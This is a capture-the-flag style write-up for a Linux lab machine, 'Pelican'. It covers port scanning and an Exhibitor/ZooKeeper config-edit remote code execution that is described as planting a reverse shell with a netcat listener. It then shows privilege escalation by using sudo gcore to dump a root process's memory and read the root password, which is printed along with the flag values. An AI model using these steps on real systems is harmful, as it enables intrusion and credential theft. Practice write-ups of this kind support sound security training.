# Linux - Pelican

---

### Host Info Gathering

- We are given a intermediate Linux machine called Pelican. With the given IP address of `192.168.181.98` , we can use `nmap` to perform a scan over TCP and UDP ports.

```bash
> nmap -sCV -A -Pn -O -p- 192.168.181.98 -oN tcpnmap.md
> sudo nmap -sU -Pn 192.168.181.98 --top-ports=100 --reason -oN udpnmap.md
```

```bash
# TCP Scan Result
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.181.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
44267/tcp open  java-rmi    Java RMI
```

### Important Info

```bash
root : ClogKingpinInning731
```

### Initial Foothold

- We notice `port 139 & 445` are open, so that we can try enumerate over SMB. I tried `smbclient` anonymous connection and `enum4linux` and getting no information. Tried `netexec` to list shared files and getting no information.

- Proceed to `port 8080` , we visit it and see a HTTP ERROR 404.
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image.png)
    

- Then use `dirsearch` and `feroxbuster` to discover directories under url but no much useful information were found.
    
    ```bash
    > dirsearch -u http://192.168.181.98:8080
    
    > feroxbuster --url http://192.168.181.98:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 50 -o ferox.md
    ```
    

- From initial `nmap` scan, we can find out there’s zookeeper running on `port 2181` . I have no idea what is zookeeper, and I googled "Zookeeper 3.4.6".
    
    There’s a related ExploitDB RCE exploit shows up as “Exhibitor Web UI 1.7.1” - https://www.exploit-db.com/exploits/48654
    
    By reviewing the content, it mentioned a vulnerable url address of `http://<Target_IP>:8080/exhibitor/v1/config/set` . Put our target ip into the url and visit it, we can get an CMS web page. 
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%201.png)
    

- On the `zookeeper` page, we can click “Config” → enable “Editing” on. Then replace a reverse shell in “java.env script” to prepare for exploit.
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%202.png)
    
    On kali, start listening port 9090.  Then return back to `zookeeper` page to execute the exploit by hitting “Commit”. Then we can get the shell as `charles` and obtain locat.txt as low-privilege user.
    
    ```bash
    > rlwrap nc -lvnp 9090
    
    - local.txt : 3362c35ed7faad2f954678c7670ee80b
    ```
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%203.png)
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%204.png)
    

### Privilege Escalation

- The next step is privilege escalation. By running `sudo -l` , we found that we can sudo run `gcore` without password.
    
    Check crontab, we can know root is running  `/usr/bin/password-store` .
    
    ```bash
    > sudo -l
    
    > cat /etc/crontab
    ```
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%205.png)
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%206.png)
    

- Checking `gcore`  on GTFOBins, we find an SUID way.
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%207.png)
    
    In order to do it, we need to find the process id we can use. Think about the password-store we found before. We can see what’s its process id. In my case, it is 486.
    
    ```bash
    > ps aux | grep "password"
    ```
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%208.png)
    

- Running as GTFOBins introduced, we can use `gcore` to create a `gcore.486` file at current path. By viewing the file content, we are able to find the password for root user. Then we can simply switch to `root`  to gain high-privilege.
    
    ```bash
    > sudo /usr/bin/gcore 486
    > cat gcore.486
    
    root : ClogKingpinInning731
    
    > su root
    	: ClogKingpinInning731
    	
    > whoami
    	: root
    
    - proof.txt : cbcb17baeeba99db4a01561111608a8c
    ```
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%209.png)
    
    ![image.png](Linux%20-%20Pelican%201b0553bebf0f8099b4c1da4d0f074b2b/image%2010.png)
    

### Reference

- https://www.exploit-db.com/exploits/48654
- https://gtfobins.github.io/gtfobins/gcore/